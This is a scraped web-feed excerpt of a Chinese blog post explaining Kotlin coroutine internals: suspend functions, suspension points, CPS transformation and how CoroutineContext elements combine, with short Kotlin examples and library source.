content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlin协程-基础设施篇-函数的挂起
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/52404619842712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Huang兄
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T03:05:25.000Z" title="Thu Jan 01 2026 03:05:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><p>种一颗树的最好时机是十年前，其次是现在。
学习也一样。
跟着霍老师的《深入理解 Kotlin 携程》学习一下协程。</p>
<h2 data-id="heading-0">函数的挂起</h2>
<p>协程的挂起和恢复能力本质上就是函数的挂起和恢复。在 kotlin 中，使用<code>suspend</code>关键字修饰的函数叫做<code>挂起函数</code>,这种函数只能在协程提或者其他挂起函数中调用。这样我们就可以把 kotlin 中的函数归为两类：普通函数和挂起函数。
挂起函数不一定真的会被挂起，它只是提供了一个挂起的条件。比如我们可以让挂起函数直接 return。</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testOne</span><span class="hljs-params">(param:<span class="hljs-type">Int</span>)</span></span>:<span class="hljs-built_in">Int</span>{
    <span class="hljs-keyword">return</span>  param * param
}
</code></pre>
<p>这里只是举个例子，这样写的话编辑器会提示我们<code>suspend</code>是个冗余的修饰符。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecf0d208903d4d4583239af1c2c45785~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSHVhbmflhYQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767841525&amp;x-signature=%2Fys2JqURwEWgp9FSzdSG1JmKHwY%3D" alt="redundant_suspend.png" loading="lazy"/>
我们再看另外一个函数</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">testThree</span><span class="hljs-params">(param: <span class="hljs-type">Int</span>)</span></span> {
    <span class="hljs-keyword">val</span> result = suspendCoroutine&lt;<span class="hljs-built_in">Int</span>&gt; { continuation -&gt; println(<span class="hljs-string">"continuation is <span class="hljs-variable">$continuation</span>"</span>)
        continuation.resumeWith(Result.success(param))
    }
    println(<span class="hljs-string">"result is <span class="hljs-variable">$result</span>"</span>)
}

</code></pre>
<p>可以看到，所谓的协程的挂起，就是程序执行流程发生异步调用时，当前调用流程进入等待状态。</p>
<h2 data-id="heading-1">挂起点</h2>
<p>对比上面两个函数来看，如果一个函数想要让自己挂起，所需要的无非就是一个 Continuation 实例，那么这个实例怎么来的？在前面的文章中也提到过，协程体本身也是一个 Continuation 实例，也正式因为这个原因，挂起函数才能在协程体内运行。
在协程内部，挂起函数的调用处被称为挂起点，挂起点如何发生异步调用，那么当前协程就会被挂起，直到对应的 Continuation 的 resume 函数被调用才会恢复执行。</p>
<p>在上面的<code>testThree</code>函数中，从打印结果可以看出获取到的<code>continuation</code>对象是一个<code>SafeContinuation</code>。</p>
<blockquote>
<p>continuation is SafeContinuation for Continuation at coroutines.MainKt.testThree</p>
</blockquote>
<p>这个类的作用也很简单：确保只有发生异步调用的时候才会挂起。
比如下面的函数就不会挂起</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">notSuspend</span><span class="hljs-params">()</span></span> = suspendCoroutine&lt;<span class="hljs-built_in">Int</span>&gt; { continuation -&gt; continuation.resumeWith(Result.success(<span class="hljs-number">0</span>)) }
</code></pre>
<p>而异步调用是否发生取决于 resume 函数与对应的挂起函数的调用是否在相同的调用栈上。</p>
<h2 data-id="heading-2">CPS 变换</h2>
<p>CPS（Continuation-Passing Style，续延传递风格）是一种编程风格，其核心思想是：函数不直接返回结果，而是接收一个额外的参数，即“续延”（Continuation），并将结果传递给这个续延。
简单来说，续延是一个函数，它代表了一个计算的“未来”或“剩余部分”。它接收一个参数（即当前计算的结果），并利用这个参数来完成后续所有的计算。
举个例子</p>
<p><strong>直接风格</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">result = add(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)
print(result)
</code></pre>
<p><strong>续延风格</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">add_cps(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, lambda result: print(result))
</code></pre>
<p>在 kotlin 里面，CPS 变换是通过传递 Continuation 实例来控制异步调用流程的。Kotlin 协程挂起的时候，就是将挂起点的信息保存在了 Continuation 对象中，它携带了协程继续执行时所需要的上下文信息，在恢复执行时，只需要执行它的恢复即可。</p>
<h2 data-id="heading-3">协程上下文</h2>
<p>上下文在很多地方都有它的身影，它只是一个概念，比如 Android 中的上下文，Spring 中的上下文，HarmonyOS 中的上下文。一般情况下，上下文承载了资源管理、获取配置等功能。
那么协程的上下文也是这样，只不过相比于其他的上下文，协程上下文有更显著的数据结构特征。
我们可以使用操作符<code>+</code>来对不同类型的协程上下文进行组装，</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">var</span> coroutineContext: CoroutineContext = EmptyCoroutineContext
coroutineContext += CoroutineName(<span class="hljs-string">"huangyuan-01"</span>)
coroutineContext += CoroutineName(<span class="hljs-string">"huangyuan-02"</span>)
coroutineContext += CoroutineExceptionHandler { context, ex -&gt; println(<span class="hljs-string">"CoroutineExceptionHandler got <span class="hljs-variable">$ex</span>"</span>) }
<span class="hljs-keyword">suspend</span> {
    println(<span class="hljs-string">"In Coroutine [<span class="hljs-subst">${coroutineContext[CoroutineName]}</span> ]."</span>)
    println(<span class="hljs-string">"In Coroutine [<span class="hljs-subst">${coroutineContext[CoroutineExceptionHandler]}</span> ]."</span>)
    <span class="hljs-number">5</span>
}.startCoroutine(<span class="hljs-keyword">object</span> : Continuation&lt;<span class="hljs-built_in">Int</span>&gt; {
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> context = coroutineContext

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">resumeWith</span><span class="hljs-params">(result: <span class="hljs-type">Result</span>&lt;<span class="hljs-type">Int</span>&gt;)</span></span> {
        result.onFailure {
            context[CoroutineExceptionHandler]?.handleException(context, it)
        }.onSuccess {
            println(<span class="hljs-string">"Coroutine [<span class="hljs-subst">${coroutineContext[CoroutineName]}</span>] completed success"</span>)
            println(<span class="hljs-string">"Coroutine [<span class="hljs-subst">${coroutineContext[CoroutineExceptionHandler]}</span>] completed success"</span>)
        }
    }
})
</code></pre>
<p>我们可以看到打印的日志</p>
<blockquote>
<p>In Coroutine [CoroutineName(huangyuan-02) ].<br/>
In Coroutine [coroutines.MainKt<span class="math math-inline"><span class="katex-error" title="ParseError: KaTeX parse error: Can't use function '$' in math mode at position 5: main$̲$inlined" style="color:#cc0000">main$$inlined</span></span>CoroutineExceptionHandler$1@4f933fd1 ].<br/>
Coroutine [CoroutineName(huangyuan-02)] completed success<br/>
Coroutine [coroutines.MainKt<span class="math math-inline"><span class="katex-error" title="ParseError: KaTeX parse error: Can't use function '$' in math mode at position 5: main$̲$inlined" style="color:#cc0000">main$$inlined</span></span>CoroutineExceptionHandler$1@4f933fd1] completed success</p>
</blockquote>
<h3 data-id="heading-4">合并规则</h3>
<ul>
<li>非交换性：ctx1 + ctx2 ≠ ctx2 + ctx1（顺序很重要）</li>
<li>结合性：(ctx1 + ctx2) + ctx3 = ctx1 + (ctx2 + ctx3)</li>
<li>键唯一性：相同 Key 的元素会被覆盖</li>
</ul>
<p>注意，这里的 Key 定义是</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Key</span>&lt;<span class="hljs-type">E : Element</span>&gt;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Element</span> : <span class="hljs-type">CoroutineContext</span> {
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> key: Key&lt;*&gt;
}
</code></pre>
<h3 data-id="heading-5">CombinedContext</h3>
<p>注意这里还有一个比较重要的类,后面重写操作符的时候会用到</p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CombinedContext</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> left: CoroutineContext,
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> element: Element
) : CoroutineContext, Serializable {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;E : Element&gt;</span> <span class="hljs-title">get</span><span class="hljs-params">(key: <span class="hljs-type">Key</span>&lt;<span class="hljs-type">E</span>&gt;)</span></span>: E? {
      <span class="hljs-keyword">var</span> cur = <span class="hljs-keyword">this</span>
      <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
          cur.element[key]?.let { <span class="hljs-keyword">return</span> it }
          <span class="hljs-keyword">val</span> next = cur.left
          <span class="hljs-keyword">if</span> (next <span class="hljs-keyword">is</span> CombinedContext) {
              cur = next
          } <span class="hljs-keyword">else</span> {
              <span class="hljs-keyword">return</span> next[key]
          }
      }
  }
}
</code></pre>
<h3 data-id="heading-6">示例</h3>
<p><strong>规则 1：相同 Key 的元素，右边的覆盖左边的</strong></p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">val</span> context1 = Job() + CoroutineName(<span class="hljs-string">"First"</span>)
<span class="hljs-keyword">val</span> context2 = CoroutineName(<span class="hljs-string">"Second"</span>) + Dispatchers.IO

<span class="hljs-keyword">val</span> result = context1 + context2
<span class="hljs-comment">// 结果包含：Job（来自context1）, Dispatchers.IO（来自context2）, CoroutineName("Second")（来自context2，覆盖了context1的）</span>
</code></pre>
<p><strong>规则 2：EmptyCoroutineContext 是中性元素</strong></p>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">val</span> context = Dispatchers.IO + CoroutineName(<span class="hljs-string">"Test"</span>)
<span class="hljs-keyword">val</span> result1 = context + EmptyCoroutineContext  <span class="hljs-comment">// 等于 context</span>
<span class="hljs-keyword">val</span> result2 = EmptyCoroutineContext + context  <span class="hljs-comment">// 等于 context</span>
</code></pre>
<p><strong>规则 3：组合是通过链表实现的</strong>
上下文组合实际上形成了一个链表结构，每个节点包含自己的元素并指向下一个上下文。</p>
<h3 data-id="heading-7">源码分析</h3>
<pre><code class="hljs language-Kotlin" lang="Kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">operator</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">plus</span><span class="hljs-params">(context: <span class="hljs-type">CoroutineContext</span>)</span></span>: CoroutineContext =
    <span class="hljs-keyword">if</span> (context === EmptyCoroutineContext) <span class="hljs-keyword">this</span> <span class="hljs-keyword">else</span> <span class="hljs-comment">// fast path -- avoid lambda creation</span>
        context.fold(<span class="hljs-keyword">this</span>) { acc, element -&gt;
            <span class="hljs-keyword">val</span> removed = acc.minusKey(element.key)
            <span class="hljs-keyword">if</span> (removed === EmptyCoroutineContext) element <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// make sure interceptor is always last in the context (and thus is fast to get when present)</span>
                <span class="hljs-keyword">val</span> interceptor = removed[ContinuationInterceptor]
                <span class="hljs-keyword">if</span> (interceptor == <span class="hljs-literal">null</span>) CombinedContext(removed, element) <span class="hljs-keyword">else</span> {
                    <span class="hljs-keyword">val</span> left = removed.minusKey(ContinuationInterceptor)
                    <span class="hljs-keyword">if</span> (left === EmptyCoroutineContext) CombinedContext(element, interceptor) <span class="hljs-keyword">else</span>
                        CombinedContext(CombinedContext(left, element), interceptor)
                }
            }
        }
</code></pre>
<p>这么看源码就比较简单了，
第一步：快速路径优化：如果合并的上下文是空的，直接返回当前上下文，避免创建 lambda 和执行 fold 操作。
第二步：这里使用了 fold 操作：
初始值：this（当前上下文）
遍历：context 中的每个 element
操作：对于每个元素，从累积值 acc 中移除相同 Key 的元素，然后处理合并
第三步：强制将拦截器放在尾部，因为在协程执行过程中，获取调度器（ContinuationInterceptor）是一个非常频繁的操作。每次协程恢复执行时都需要检查当前的调度器,现在通过强制让拦截器位于链尾，使得查找可以在 O(1) 时间内完成。</p>
<p>这样我们就了解了<code>CoroutineContext.plus</code>这个 Kotlin 协程上下文系统的核心函数，理解这个方法的工作原理对于编写高效、可维护的协程代码至关重要，特别是在需要精细控制协程执行环境的场景中。</p>
<hr/>
<p>以上</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlin协程-官方框架]]></title>    <link>https://juejin.cn/post/7589893170387566592</link>    <guid>https://juejin.cn/post/7589893170387566592</guid>    <pubDate>2026-01-01T03:07:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893170387566592" data-draft-id="7589870367764201512" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlin协程-官方框架"/> <meta itemprop="keywords" content="Kotlin"/> <meta itemprop="datePublished" content="2026-01-01T03:07:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Huang兄"/> <meta itemprop="url" content="https://juejin.cn/user/52404619842712"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlin协程-官方框架
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/52404619842712/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Huang兄
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T03:07:29.000Z" title="Thu Jan 01 2026 03:07:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
